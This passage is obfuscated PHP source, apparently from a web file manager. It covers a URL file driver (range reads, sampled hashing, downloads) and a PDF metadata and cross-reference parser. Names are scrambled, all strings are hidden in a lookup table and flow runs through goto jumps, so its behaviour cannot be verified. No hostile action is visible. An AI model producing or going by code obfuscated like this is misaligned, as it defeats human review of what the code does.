$a‡÷İˆª’[$_SERVER[í…¶][188]]; } public function isFile($Bˆáˆ†Ê”‚) { $e×ììè¥ŒÆ = $this->info($Bˆáˆ†Ê”‚); return $e×ììè¥ŒÆ[$_SERVER[í…¶][188]]; } public function isFolder($Dİ¹ó„¹“) { return !1; } public function size($C¤Îù–×‰‰) { $AƒÙŒˆƒ™— = $this->info($C¤Îù–×‰‰); return $AƒÙŒˆƒ™—[$_SERVER[í…¶][77]]; } public function info($AÔ«º©³¬‰) { return $this->infoParse($AÔ«º©³¬‰); } public function infoAuth($A†¤„ùª÷) { return $this->infoParse($A†¤„ùª÷); } public function infoWithChildren($e©æš¶½ë£) { return $this->infoParse($e©æš¶½ë£); } public function infoFull($cî÷¢Ïö„) { return $this->infoParse($cî÷¢Ïö„); } private function infoParse($DÃ»êæ‚ÖÁ) { $BÕÔáº‘ƒ  =& $_SERVER[í…¶]; $f¼»ò Çñ§ = $this->header($DÃ»êæ‚ÖÁ); if (!$f¼»ò Çñ§ || !$f¼»ò Çñ§[$BÕÔáº‘ƒ [691]]) { return !1; } $A„‚÷¿Õ… = _get($f¼»ò Çñ§, $BÕÔáº‘ƒ [325], 0); $c„ˆÔåèå = array($BÕÔáº‘ƒ [28] => $f¼»ò Çñ§[$BÕÔáº‘ƒ [28]], $BÕÔáº‘ƒ [75] => $DÃ»êæ‚ÖÁ, $BÕÔáº‘ƒ [29] => $BÕÔáº‘ƒ [167], $BÕÔáº‘ƒ [77] => intval($A„‚÷¿Õ…), $BÕÔáº‘ƒ [160] => get_path_ext($f¼»ò Çñ§[$BÕÔáº‘ƒ [28]]), $BÕÔáº‘ƒ [1160] => $A„‚÷¿Õ… > 0 && $f¼»ò Çñ§[$BÕÔáº‘ƒ [1286]], $BÕÔáº‘ƒ [1161] => !1); return $c„ˆÔåèå; } private function header($bßƒŒ’Ë) { if (isset(self::$_cacheHeader[$bßƒŒ’Ë])) { return self::$_cacheHeader[$bßƒŒ’Ë]; } self::$_cacheHeader[$bßƒŒ’Ë] = url_header($bßƒŒ’Ë); return self::$_cacheHeader[$bßƒŒ’Ë]; } public function hashSimple($b´“Œ¿çÂ·, $cê¢ˆí‡™ = false) { goto Bµ¡‡ŠßÕº; CïõÂÓ‡©Û: $aÓñˆæ¬ÁŒ = $f­ îÏ“‹„[$D¬«»¶Âã[77]]; $D›öÜ÷Àˆ„ = 200; $fÙâÉŞœÁ‹ = 50; goto c‘Ş„ø¤Î¶; Bµ¡‡ŠßÕº: $D¬«»¶Âã =& $_SERVER[í…¶]; $f­ îÏ“‹„ = $this->info($b´“Œ¿çÂ·); if (!$f­ îÏ“‹„ || !$f­ îÏ“‹„[$D¬«»¶Âã[188]]) { return !1; } goto CïõÂÓ‡©Û; C²É²“Ê¿: $fµøÇšÖÎ± = timeFloat(); $e‰ñ°§Åò = 15; for ($C ‘ìŒ†Š = 0; $C ‘ìŒ†Š < $fÙâÉŞœÁ‹; $C ‘ìŒ†Š++) { if (timeFloat() - $fµøÇšÖÎ± > $e‰ñ°§Åò) { return !1; } $cÓĞ‘ÏÊŠ = $this->fileSubstr($b´“Œ¿çÂ·, $a¬•„Ø˜£ * $C ‘ìŒ†Š, $D›öÜ÷Àˆ„); if (!$cÓĞ‘ÏÊŠ) { return !1; } $d¶Öó´áî .= $cÓĞ‘ÏÊŠ; } goto bÂ¨–ˆŒ†‡; c‘Ş„ø¤Î¶: if ($aÓñˆæ¬ÁŒ <= $D›öÜ÷Àˆ„ * $fÙâÉŞœÁ‹) { return md5($this->fileSubstr($b´“Œ¿çÂ·, 0, $aÓñˆæ¬ÁŒ)) . $aÓñˆæ¬ÁŒ; } $a¬•„Ø˜£ = intval($aÓñˆæ¬ÁŒ / $fÙâÉŞœÁ‹); $d¶Öó´áî = $D¬«»¶Âã[33]; goto C²É²“Ê¿; bÂ¨–ˆŒ†‡: $d¶Öó´áî .= $this->fileSubstr($b´“Œ¿çÂ·, $aÓñˆæ¬ÁŒ - $D›öÜ÷Àˆ„, $D›öÜ÷Àˆ„); return md5($d¶Öó´áî) . $aÓñˆæ¬ÁŒ; goto aÂ•Ëİ»Íø; aÂ•Ëİ»Íø: } public function getContent($eÃ©İÀÕ) { return $this->fileSubstr($eÃ©İÀÕ); } public function fileSubstr($C§ÁÔºŸíá, $E—»¯Ã‡îÆ = 0, $B‘‹’å¡© = -1) { goto c˜Ö¦‰Úê; C¶Ïá»Íùö: if ($B‘‹’å¡© === -1) { $B‘‹’å¡© = $Aîø‘Ñ½º…[$FœÓ°§¨Ù[77]]; } if ($B‘‹’å¡© == 0) { return $FœÓ°§¨Ù[33]; } $AÇ¶ˆ¬ƒ– = array($FœÓ°§¨Ù[1287] . $E—»¯Ã‡îÆ . $FœÓ°§¨Ù[718] . ($E—»¯Ã‡îÆ + $B‘‹’å¡© - 1)); goto Fé¥ëÒˆ; c˜Ö¦‰Úê: $FœÓ°§¨Ù =& $_SERVER[í…¶]; $Aîø‘Ñ½º… = $this->info($C§ÁÔºŸíá); if (!$Aîø‘Ñ½º… || !$Aîø‘Ñ½º…[$FœÓ°§¨Ù[188]] && $Aîø‘Ñ½º…[$FœÓ°§¨Ù[77]] > 1024 * 1024 * 10) { return !1; } goto C¶Ïá»Íùö; Fé¥ëÒˆ: $Aê–Ò‹éÀ = url_request($C§ÁÔºŸíá, $FœÓ°§¨Ù[216], !1, $AÇ¶ˆ¬ƒ–, !1, !1, 1); return $Aê–Ò‹éÀ[$FœÓ°§¨Ù[1032]] ? $Aê–Ò‹éÀ[$FœÓ°§¨Ù[1032]] : $FœÓ°§¨Ù[33]; goto A†‰«Æ”Ñæ; A†‰«Æ”Ñæ: } public function download($a“²´‡‚“, $f¾ˆª‚¤éè) { Downloader::start($a“²´‡‚“, $f¾ˆª‚¤éè); return $f¾ˆª‚¤éè; } } goto cÈ†Ìƒ½¿°; b°°‰˜‰¼Ë: class FileParsePdf { public static function parse($añ½é†Ù) { goto fèÁµö°§¾; Bê‹Ÿñ©Ô: preg_match_all($eóËôÒ²•‚, $fÎ‚ô¬±®‚[$F·±’È©²[1529]], $CÅ°Íœİƒ); if ($CÅ°Íœİƒ[1] && $còŠ™¡“Î[$F·±’È©²[1536]] < $CÅ°Íœİƒ[1][0]) { $còŠ™¡“Î[$F·±’È©²[1536]] = $CÅ°Íœİƒ[1][0]; } preg_match_all($eóËôÒ²•‚, $fÎ‚ô¬±®‚[$F·±’È©²[1530]], $CÅ°Íœİƒ); goto c…™Ñ¡”ß; fèÁµö°§¾: $F·±’È©² =& $_SERVER[í…¶]; $aØì¬˜‰Ê = 32 * 1024; $fÎ‚ô¬±®‚ = array($F·±’È©²[779] => fopen($añ½é†Ù, $F·±’È©²[1168]), $F·±’È©²[75] => $añ½é†Ù, $F·±’È©²[77] => filesize($añ½é†Ù), $F·±’È©²[1528] => $aØì¬˜‰Ê); goto F»ÆğíµÔ; B–„ëóáæŒ: $eóËôÒ²•‚ = $F·±’È©²[1533]; preg_match($eóËôÒ²•‚, $fÎ‚ô¬±®‚[$F·±’È©²[1529]], $CÅ°Íœİƒ); if (!$còŠ™¡“Î[$F·±’È©²[1532]] && count($CÅ°Íœİƒ) == 5) { $còŠ™¡“Î[$F·±’È©²[1532]] = $CÅ°Íœİƒ[3]; $còŠ™¡“Î[$F·±’È©²[1534]] = $CÅ°Íœİƒ[4]; } goto eİÈÀæÛÓ; eİÈÀæÛÓ: preg_match($eóËôÒ²•‚, $fÎ‚ô¬±®‚[$F·±’È©²[1530]], $CÅ°Íœİƒ); if (!$còŠ™¡“Î[$F·±’È©²[1532]] && count($CÅ°Íœİƒ) == 5) { $còŠ™¡“Î[$F·±’È©²[1532]] = $CÅ°Íœİƒ[3]; $còŠ™¡“Î[$F·±’È©²[1534]] = $CÅ°Íœİƒ[4]; } preg_match($F·±’È©²[1535], $fÎ‚ô¬±®‚[$F·±’È©²[1529]], $CÅ°Íœİƒ); goto A´øÖ„£; c…™Ñ¡”ß: if ($CÅ°Íœİƒ[1] && $còŠ™¡“Î[$F·±’È©²[1536]] < $CÅ°Íœİƒ[1][0]) { $còŠ™¡“Î[$F·±’È©²[1536]] = $CÅ°Íœİƒ[1][0]; } $còŠ™¡“Î = self::parseInfoItem($còŠ™¡“Î); return $còŠ™¡“Î; goto dÈØ¸ğ½Ì; A´øÖ„£: if ($CÅ°Íœİƒ) { $còŠ™¡“Î[$F·±’È©²[1338]] = $CÅ°Íœİƒ[1]; } $còŠ™¡“Î[$F·±’È©²[1536]] = 0; $eóËôÒ²•‚ = $F·±’È©²[1537]; goto Bê‹Ÿñ©Ô; F»ÆğíµÔ: $fÎ‚ô¬±®‚[$F·±’È©²[1529]] = StreamWrapperIO::read($añ½é†Ù, 0, $aØì¬˜‰Ê); $fÎ‚ô¬±®‚[$F·±’È©²[1530]] = StreamWrapperIO::read($añ½é†Ù, $fÎ‚ô¬±®‚[$F·±’È©²[77]] - $aØì¬˜‰Ê, $aØì¬˜‰Ê); $eº‚Ø‰“ÈÆ = self::decodeXref($fÎ‚ô¬±®‚); goto bäãÚÂ­˜­; bäãÚÂ­˜­: if ($eº‚Ø‰“ÈÆ) { $F¯ÔÕù¦„ = $eº‚Ø‰“ÈÆ[$F·±’È©²[1531]][$F·±’È©²[1190]]; $còŠ™¡“Î = self::getObjectValue($fÎ‚ô¬±®‚, $eº‚Ø‰“ÈÆ, $F¯ÔÕù¦„); } $còŠ™¡“Î = is_array($còŠ™¡“Î) ? $còŠ™¡“Î : array(); $còŠ™¡“Î[$F·±’È©²[1532]] = 0; goto B–„ëóáæŒ; dÈØ¸ğ½Ì: } private static function parseInfoItem($aæîŒÁÓéÑ) { $f¢òĞäèì¨ =& $_SERVER[í…¶]; if (!$aæîŒÁÓéÑ) { return !1; } $e²©ê¦· = array($f¢òĞäèì¨[1339] => array($f¢òĞäèì¨[1538], $f¢òĞäèì¨[33]), $f¢òĞäèì¨[1539] => array($f¢òĞäèì¨[1540], $f¢òĞäèì¨[33]), $f¢òĞäèì¨[187] => array($f¢òĞäèì¨[1541], $f¢òĞäèì¨[210]), $f¢òĞäèì¨[107] => array($f¢òĞäèì¨[1542], $f¢òĞäèì¨[210]), $f¢òĞäèì¨[1536] => array($f¢òĞäèì¨[1536], $f¢òĞäèì¨[276]), $f¢òĞäèì¨[1532] => array($f¢òĞäèì¨[1532], $f¢òĞäèì¨[276]), $f¢òĞäèì¨[1534] => array($f¢òĞäèì¨[1534], $f¢òĞäèì¨[276]), $f¢òĞäèì¨[1543] => array($f¢òĞäèì¨[1544], $f¢òĞäèì¨[33]), $f¢òĞäèì¨[1545] => array($f¢òĞäèì¨[1546], $f¢òĞäèì¨[33]), $f¢òĞäèì¨[1547] => array($f¢òĞäèì¨[1338], $f¢òĞäèì¨[33])); $D»’†Óì›‰ = array(); foreach ($e²©ê¦· as $f©¿«ôêµí => $cÆˆó¾¶©Ù) { if (!isset($aæîŒÁÓéÑ[$cÆˆó¾¶©Ù[0]])) { continue; } $d³Ü‰óˆ¬  = $aæîŒÁÓéÑ[$cÆˆó¾¶©Ù[0]]; if (!$d³Ü‰óˆ¬  || is_array($d³Ü‰óˆ¬ )) { continue; } switch ($cÆˆó¾¶©Ù[1]) { case $f¢òĞäèì¨[276]: $d³Ü‰óˆ¬  = intval($d³Ü‰óˆ¬ ); break; case $f¢òĞäèì¨[210]: if (substr($d³Ü‰óˆ¬ , 0, 2) == $f¢òĞäèì¨[1548]) { $d³Ü‰óˆ¬  = substr($d³Ü‰óˆ¬ , 2, 14); } if (strtotime($d³Ü‰óˆ¬ )) { $d³Ü‰óˆ¬  = date($f¢òĞäèì¨[1549], strtotime($d³Ü‰óˆ¬ )); } break; } $D»’†Óì›‰[$f©¿«ôêµí] = $d³Ü‰óˆ¬ ; } return $D»’†Óì›‰; } private static function decodeXref(&$cöõˆÑ·ò”) { goto AÄ™Û‰¥î; E‘ğ¾Ô‹¦‰: if (preg_match($aİÔ÷ÜÏ–„[1564], $DƒÑ‹òéš—, $b—ÕÆÍ²î) > 0) { } return $Aµ—È…»; goto d»…ˆÔ¾ç¥; BÊâ‰á«°Í: if (preg_match($aİÔ÷ÜÏ–„[1557], $DƒÑ‹òéš—, $b—ÕÆÍ²î) > 0) { $Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[77]] = intval($b—ÕÆÍ²î[1]); } if (preg_match($aİÔ÷ÜÏ–„[1558], $DƒÑ‹òéš—, $b—ÕÆÍ²î) > 0) { $Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[1559]] = intval($b—ÕÆÍ²î[1]) . $aİÔ÷ÜÏ–„[70] . intval($b—ÕÆÍ²î[2]); } if (preg_match($aİÔ÷ÜÏ–„[1560], $DƒÑ‹òéš—, $b—ÕÆÍ²î) > 0) { $Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[1561]] = intval($b—ÕÆÍ²î[1]) . $aİÔ÷ÜÏ–„[70] . intval($b—ÕÆÍ²î[2]); } goto bâŠóÖáĞ; AÇâ¬ËËè: $fâõò‡­Ñ© = $aİÔ÷ÜÏ–„[1551]; if (!preg_match_all($fâõò‡­Ñ©, $b ¤Ë¨ÁÚÓ, $b—ÕÆÍ²î, PREG_SET_ORDER, 0)) { return !1; } $C÷Ê™Œ§ÔÙ = intval($b—ÕÆÍ²î[0][1]); goto b „ºĞåÓ…; bâŠóÖáĞ: if (preg_match($aİÔ÷ÜÏ–„[1562], $DƒÑ‹òéš—, $b—ÕÆÍ²î) > 0) { $Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[1190]] = intval($b—ÕÆÍ²î[1]) . $aİÔ÷ÜÏ–„[70] . intval($b—ÕÆÍ²î[2]); } if (preg_match($aİÔ÷ÜÏ–„[1563], $DƒÑ‹òéš—, $b—ÕÆÍ²î) > 0) { $Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[376]] = array(); $Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[376]][0] = $b—ÕÆÍ²î[1]; $Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[376]][1] = $b—ÕÆÍ²î[2]; } if (!$Aµ—È…»[$aİÔ÷ÜÏ–„[1531]][$aİÔ÷ÜÏ–„[1190]]) { return !1; } goto E‘ğ¾Ô‹¦‰; b „ºĞåÓ…: if ($cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[77]] - $C÷Ê™Œ§ÔÙ > $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1528]]) { $bÏÆ¢ùöÛ = 4 * $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1528]]; $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1528]] = $bÏÆ¢ùöÛ; $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1529]] = StreamWrapperIO::read($cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[75]], 0, $bÏÆ¢ùöÛ); $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1530]] = StreamWrapperIO::read($cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[75]], $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[77]] - $bÏÆ¢ùöÛ, $bÏÆ¢ùöÛ); $b ¤Ë¨ÁÚÓ = $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1530]]; } $EÈ‘ÉœÏ†è = 0; preg_match_all($aİÔ÷ÜÏ–„[1552], $b ¤Ë¨ÁÚÓ, $b—ÕÆÍ²î); goto CÄ÷‡­è•­; AÄ™Û‰¥î: $aİÔ÷ÜÏ–„ =& $_SERVER[í…¶]; $b ¤Ë¨ÁÚÓ = $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1530]]; $Aµ—È…» = array($aİÔ÷ÜÏ–„[1531] => array(), $aİÔ÷ÜÏ–„[1550] => array()); goto AÇâ¬ËËè; CÄ÷‡­è•­: foreach ($b—ÕÆÍ²î[3] as $CÑá©£«ª => $B¿ø‰îÁ«ù) { if ($b—ÕÆÍ²î[3][$CÑá©£«ª] == $aİÔ÷ÜÏ–„[1553]) { $B£¨øØÈÉÑ = $EÈ‘ÉœÏ†è . $aİÔ÷ÜÏ–„[70] . intval($b—ÕÆÍ²î[2][$CÑá©£«ª]); $Aµ—È…»[$aİÔ÷ÜÏ–„[1550]][$B£¨øØÈÉÑ] = intval($b—ÕÆÍ²î[1][$CÑá©£«ª]); ++$EÈ‘ÉœÏ†è; } else { if ($b—ÕÆÍ²î[3][$CÑá©£«ª] == $aİÔ÷ÜÏ–„[1554]) { ++$EÈ‘ÉœÏ†è; } else { } } } if (preg_match_all($aİÔ÷ÜÏ–„[1555], $b ¤Ë¨ÁÚÓ, $b—ÕÆÍ²î)) { $C×˜»ô»÷• = $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[77]] - $cöõˆÑ·ò”[$aİÔ÷ÜÏ–„[1528]]; foreach ($b—ÕÆÍ²î[0] as $CÑá©£«ª => $BİÄÎ¾Å) { $aã¯¹ÌÅ = $b—ÕÆÍ²î[1][$CÑá©£«ª] . $aİÔ÷ÜÏ–„[70] . $b—ÕÆÍ²î[2][$CÑá©£«ª]; $Aµ—È…»[$aİÔ÷ÜÏ–„[1550]][$aã¯¹ÌÅ] = strpos($b ¤Ë¨ÁÚÓ, $BİÄÎ¾Å) + $C×˜»ô»÷• + 1; } } if (preg_match_all($aİÔ÷ÜÏ–„[1556], $b ¤Ë¨ÁÚÓ, $b—ÕÆÍ²î)) { $DƒÑ‹òéš— = count($b—ÕÆÍ²î[1]) == 1 ? $b—ÕÆÍ²î[1][0] : $b—ÕÆÍ²î[1][1]; } else { $DƒÑ‹òéš— = substr($b ¤Ë¨ÁÚÓ, -1024 * 5); } goto BÊâ‰á«°Í; d»…ˆÔ¾ç¥: } private static function getObjectValue($Cİî§Â©å, $E•ÖÍ‡íÇö, $e½´ÒëÕ÷’) { goto cÚÈ¥ë­Óî; cÚÈ¥ë­Óî: $a³Æìœ¾öÍ =& $_SERVER[í…¶]; $aƒôÙ…ˆç = self::getObject($Cİî§Â©å, $E•ÖÍ‡íÇö[$a³Æìœ¾öÍ[1550]][$e½´ÒëÕ÷’]); if (is_string($aƒôÙ…ˆç[1])) { return $aƒôÙ…ˆç[1]; } goto B¹™„¼´­°; B¹™„¼´­°: if (!is_array($aƒôÙ…ˆç[1])) { return array(); } $cÃòŠ›ğ¹¯ = array(); for ($D‡Öäè¬Ñ = 0; $D‡Öäè¬Ñ < count($aƒôÙ…ˆç[1]); $D‡Öäè¬Ñ += 2) { $A‰ÛÑÙÔ‰‹ = $aƒôÙ…ˆç[1][$D‡Öäè¬Ñ]; $A•‘÷‚İ”ê = $aƒôÙ…ˆç[1][$D‡Öäè¬Ñ + 1]; if (count($A‰ÛÑÙÔ‰‹) == 3 && $A‰ÛÑÙÔ‰‹[0] == $a³Æìœ¾öÍ[8]) { $eÌÑŞˆÙõ = !1; if ($A•‘÷‚İ”ê[0] == $a³Æìœ¾öÍ[1565]) { $A•‘÷‚İ”ê = self::getObject($Cİî§Â©å, $E•ÖÍ‡íÇö[$a³Æìœ¾öÍ[1550]][$A•‘÷‚İ”ê[1]]); } $eÌÑŞˆÙõ = $A•‘÷‚İ”ê[1]; if ($eÌÑŞˆÙõ === !1) { continue; } if (is_string($eÌÑŞˆÙõ)) { $eÌÑŞˆÙõ = self::decodeStr($eÌÑŞˆÙõ); } $cÃòŠ›ğ¹¯[$A‰ÛÑÙÔ‰‹[1]] = $eÌÑŞˆÙõ; } } goto B¯Ó¶…‚¡›; B¯Ó¶…‚¡›: return $cÃòŠ›ğ¹¯; goto eˆÌ±ùÓ™è; eˆÌ±ùÓ™è: } private static function getObject($c‘×•îÂÅ, $fÌ£‘ˆÜ·Å) { $Fù°áÎÎ…ó = self::getObjectItem($c‘×•îÂÅ, $fÌ£‘ˆÜ·Å); $Fù°áÎÎ…ó = self::getObjectItem($c‘×•îÂÅ, $Fù°áÎÎ…ó[2]); return $Fù°áÎÎ…ó; } private static function getObjectItem($Däí½Ò­Û, $b£Õ°™¢ùñ) { goto cØŠ ³ğ´; cØŠ ³ğ´: $F¼éí†ç » =& $_SERVER[í…¶]; $aëÌä‰Ş… = $Däí½Ò­Û[$F¼éí†ç »[1528]]; $aÈ…“¨ŸŞÈ = $Däí½Ò­Û[$F¼éí†ç »[77]] - $aëÌä‰Ş…; goto c·Á†æ–µ; eÖ²è°ÕŠï: $f¶Ü÷ôÑ¤æ = self::getRawObject($aËùÚ‚ˆÆ, $Cµ½áò³Û™); if ($b£Õ°™¢ùñ >= $aÈ…“¨ŸŞÈ) { $f¶Ü÷ôÑ¤æ[2] = $f¶Ü÷ôÑ¤æ[2] + $aÈ…“¨ŸŞÈ; } else { if ($b£Õ°™¢ùñ > $aëÌä‰Ş… && $b£Õ°™¢ùñ <= $aÈ…“¨ŸŞÈ) { $f¶Ü÷ôÑ¤æ[2] = $f¶Ü÷ôÑ¤æ[2] + $b£Õ°™¢ùñ; } } return $f¶Ü÷ôÑ¤æ; goto FÉŸƒÇè§¢; c·Á†æ–µ: $Cµ½áò³Û™ = $b£Õ°™¢ùñ >= $aÈ…“¨ŸŞÈ ? $b£Õ°™¢ùñ - $aÈ…“¨ŸŞÈ : $b£Õ°™¢ùñ; $aËùÚ‚ˆÆ = $b£Õ°™¢ùñ >= $aÈ…“¨ŸŞÈ ? $Däí½Ò­Û[$F¼éí†ç »[1530]] : $Däí½Ò­Û[$F¼éí†ç »[1529]]; if ($b£Õ°™¢ùñ > $aëÌä‰Ş… && $b£Õ°™¢ùñ <= $aÈ…“¨ŸŞÈ) { $Cµ½áò³Û™ = 0; $aËùÚ‚ˆÆ = StreamWrapperIO::read($Däí½Ò­Û[$F¼éí†ç »[75]], $b£Õ°™¢ùñ, $aëÌä‰Ş…); } goto eÖ²è°ÕŠï; FÉŸƒÇè§¢: } private static function decodeStr($DÁŒÂËÍª°) { goto A²ë©‘²¬ê; E°Áà¼Åö: $DÁŒÂËÍª° = $A•š¶È×Á[33]; foreach ($e•Ñ«â¦¼ as $cÙ·…à´¸) { if (preg_match($A•š¶È×Á[1577], $cÙ·…à´¸)) { $DÁŒÂËÍª° .= \chr(hexdec(trim($cÙ·…à´¸, $A•š¶È×Á[1578]))); } else { $DÁŒÂËÍª° .= $cÙ·…à´¸; } } $e•Ñ«â¦¼ = preg_split($A•š¶È×Á[1579], $DÁŒÂËÍª°, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bšÙ‰­„‰ ; bˆáÜ¡Ã¬Ü: return $DÁŒÂËÍª°; goto e‹’ª¹áèí; bšÙ‰­„‰ : $DÁŒÂËÍª° = $A•š¶È×Á[33]; foreach ($e•Ñ«â¦¼ as $cÙ·…à´¸) { if (preg_match($A•š¶È×Á[1580], $cÙ·…à´¸) && !1 === stripos($cÙ·…à´¸, $A•š¶È×Á[1581])) { $cÙ·…à´¸ = preg_replace($A•š¶È×Á[1582], $A•š¶È×Á[33], $cÙ·…à´¸); $cÙ·…à´¸ = trim($cÙ·…à´¸, $A•š¶È×Á[924]); $cÙ·…à´¸ = pack($A•š¶È×Á[1583], $cÙ·…à´¸); $DÁŒÂËÍª° .= $cÙ·…à´¸; } else { $DÁŒÂËÍª° .= $cÙ·…à´¸; } } if (preg_match($A•š¶È×Á[1584], $DÁŒÂËÍª°)) { $B«Õ¡Í¬•ï = substr($DÁŒÂËÍª°, 2); $DÁŒÂËÍª° = $A•š¶È×Á[33]; $DÄ ä„à˜å = strlen($B«Õ¡Í¬•ï); for ($dÁÎ‚—íè = 0; $dÁÎ‚—íè < $DÄ ä„à˜å; $dÁÎ‚—íè += 2) { $d½°ŒãÑ = hexdec(bin2hex(substr($B«Õ¡Í¬•ï, $dÁÎ‚—íè, 2))); $DÁŒÂËÍª° .= mb_convert_encoding($A•š¶È×Á[1585] . intval($d½°ŒãÑ) . $A•š¶È×Á[67], $A•š¶È×Á[1586], $A•š¶È×Á[1587]); } } goto bˆáÜ¡Ã¬Ü; eØµˆÇÅ½: $DÁŒÂËÍª° = $A•š¶È×Á[33]; foreach ($e•Ñ«â¦¼ as $cÙ·…à´¸) { if (preg_match($A•š¶È×Á[1575], $cÙ·…à´¸)) { $DÁŒÂËÍª° .= \chr(octdec(trim($cÙ·…à´¸, $A•š¶È×Á[93]))); } else { $DÁŒÂËÍª° .= $cÙ·…à´¸; } } $e•Ñ«â¦¼ = preg_split($A•š¶È×Á[1576], $DÁŒÂËÍª°, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto E°Áà¼Åö; A²ë©‘²¬ê: $A•š¶È×Á =& $_SERVER[í…¶]; $DÁŒÂËÍª° = str_replace(array($A•š¶È×Á[1566], $A•š¶È×Á[1567], $A•š¶È×Á[1568], $A•š¶È×Á[1569], $A•š¶È×Á[1570], $A•š¶È×Á[1571], $A•š¶È×Á[1572], $A•š¶È×Á[1573]), array($A•š¶È×Á[93], $A•š¶È×Á[50], $A•š¶È×Á[8], $A•š¶È×Á[248], $A•š¶È×Á[815], $A•š¶È×Á[217], $A•š¶È×Á[990], $A•š¶È×Á[330]), $DÁŒÂËÍª°); $e•Ñ«â¦¼ = preg_split($A•š¶È×Á[1574], $DÁŒÂËÍª°, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto eØµˆÇÅ½; e‹’ª¹áèí: } private static function getRawObject($a¶§ñÄæ, $bÖĞË§Ï¢È = 0) { goto B¤…øÕÏõÔ; B¤…øÕÏõÔ: $B¯íÂ­¶“ =& $_SERVER[í…¶]; $f Îğ™íë¤ = $B¯íÂ­¶“[33]; $D·šÍ¿ÛäÒ = $B¯íÂ­¶“[33]; goto fƒğìÜ÷Œë; fƒğìÜ÷Œë: $bÖĞË§Ï¢È += strspn($a¶§ñÄæ, $B¯íÂ­¶“[1588], $bÖĞË§Ï¢È); $D§á¸¨¥ò· = $a¶§ñÄæ[$bÖĞË§Ï¢È]; switch ($D§á¸¨¥ò·) { case $B¯íÂ­¶“[1589]: $AŒ¬÷È¹áÂ = strcspn($a¶§ñÄæ, $B¯íÂ­¶“[1590], $bÖĞË§Ï¢È); if ($AŒ¬÷È¹áÂ > 0) { $bÖĞË§Ï¢È += $AŒ¬÷È¹áÂ; return self::getRawObject($a¶§ñÄæ, $bÖĞË§Ï¢È); } break; case $B¯íÂ­¶“[8]: $f Îğ™íë¤ = $D§á¸¨¥ò·; ++$bÖĞË§Ï¢È; $bñ­–…À¡Â = preg_match($B¯íÂ­¶“[1591], substr($a¶§ñÄæ, $bÖĞË§Ï¢È, 256), $cÜë¶¯¨¸); if (1 == $bñ­–…À¡Â) { $D·šÍ¿ÛäÒ = $cÜë¶¯¨¸[1]; $bÖĞË§Ï¢È += strlen($D·šÍ¿ÛäÒ); } break; case $B¯íÂ­¶“[248]: case $B¯íÂ­¶“[815]: $f Îğ™íë¤ = $D§á¸¨¥ò·; ++$bÖĞË§Ï¢È; $BˆÉò…«æÜ = $bÖĞË§Ï¢È; if ($B¯íÂ­¶“[248] == $D§á¸¨¥ò·) { $dÎ««¤ßéœ = 1; while ($dÎ««¤ßéœ > 0) { if (!isset($a¶§ñÄæ[$BˆÉò…«æÜ])) { break; } $BÇÃËÎÓĞ³ = $a¶§ñÄæ[$BˆÉò…«æÜ]; switch ($BÇÃËÎÓĞ³) { case $B¯íÂ­¶“[93]: ++$BˆÉò…«æÜ; break; case $B¯íÂ­¶“[248]: ++$dÎ««¤ßéœ; break; case $B¯íÂ­¶“[815]: --$dÎ««¤ßéœ; break; } ++$BˆÉò…«æÜ; } $D·šÍ¿ÛäÒ = substr($a¶§ñÄæ, $bÖĞË§Ï¢È, $BˆÉò…«æÜ - $bÖĞË§Ï¢È - 1); $bÖĞË§Ï¢È = $BˆÉò…«æÜ; } break; case $B¯íÂ­¶“[157]: case $B¯íÂ­¶“[485]: $f Îğ™íë¤ = $D§á¸¨¥ò·; ++$bÖĞË§Ï¢È; if ($B¯íÂ­¶“[157] == $D§á¸¨¥ò·) { $D·šÍ¿ÛäÒ = array(); do { $fğ’ëÅÄö• = $bÖĞË§Ï¢È; $eËŸÍÏ… = self::getRawObject($a¶§ñÄæ, $bÖĞË§Ï¢È); $bÖĞË§Ï¢È = $eËŸÍÏ…[2]; $D·šÍ¿ÛäÒ[] = $eËŸÍÏ…; } while ($B¯íÂ­¶“[485] != $eËŸÍÏ…[0] && $bÖĞË§Ï¢È != $fğ’ëÅÄö•); array_pop($D·šÍ¿ÛäÒ); } break; case $B¯íÂ­¶“[923]: case $B¯íÂ­¶“[926]: if (isset($a¶§ñÄæ[$bÖĞË§Ï¢È + 1]) && $a¶§ñÄæ[$bÖĞË§Ï¢È + 1] == $D§á¸¨¥ò·) { $f Îğ™íë¤ = $D§á¸¨¥ò· . $D§á¸¨¥ò·; $bÖĞË§Ï¢È += 2; if ($B¯íÂ­¶“[923] == $D§á¸¨¥ò·) { $D·šÍ¿ÛäÒ = array(); do { $fğ’ëÅÄö• = $bÖĞË§Ï¢È; $eËŸÍÏ… = self::getRawObject($a¶§ñÄæ, $bÖĞË§Ï¢È); $bÖĞË§Ï¢È = $eËŸÍÏ…[2]; $D·šÍ¿ÛäÒ[] = $eËŸÍÏ…; } while ($B¯íÂ­¶“[1592] != $eËŸÍÏ…[0] && $bÖĞË§Ï¢È != $fğ’ëÅÄö•); array_pop($D·šÍ¿ÛäÒ); } } else { $f Îğ™íë¤ = $D§á¸¨¥ò·; ++$bÖĞË§Ï¢È; 